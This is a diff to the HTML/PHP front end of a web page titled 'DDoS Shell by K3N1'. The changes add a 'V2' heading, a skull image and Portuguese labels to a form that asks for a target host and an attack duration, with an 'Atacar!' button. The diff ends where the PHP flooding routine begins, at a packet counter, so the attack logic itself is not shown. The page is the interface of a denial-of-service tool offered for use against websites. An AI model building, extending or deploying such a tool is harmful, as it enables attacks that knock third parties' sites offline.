@@ -27,13 +27,16 @@
 <body>
 	<center>
 		<form method="post" action="">
-			<h1>DDoS Shell by K3N1</h1>
-			<input type="text" name="host" placeholder="Host">
+			<h1>DDoS Shell by K3N1<font color="Red" face="courier" size="6" style="text-shadow: 0px 0px 10px;"></h1>
+			<h2>V2<font color="Red" face="courier" size="6" style="text-shadow: 0px 0px 5px;"></h2>
+			<input type="text" name="host" placeholder="Host do Site">
+			<img height="300" src="http://www.clickgratis.com.br/fotos-imagens/caveira/aHR0cDovL2ltZzEucmVjYWRvc29ubGluZS5jb20vMzY5LzAyOC5naWY=.jpg" widht="50">
 			<br />
-			<input type="text" name="time" placeholder="Time">
+			<input type="text" name="time" placeholder="Tempo do DDOS">
 			<br />
-			<input type="submit" value="Attack!">
+			<input type="submit" value="Atacar!">
 			<br />
+
 			<?php 
 				if(isset($_POST['host']) and isset($_POST['time'])) {
 					$pacotes = 0;
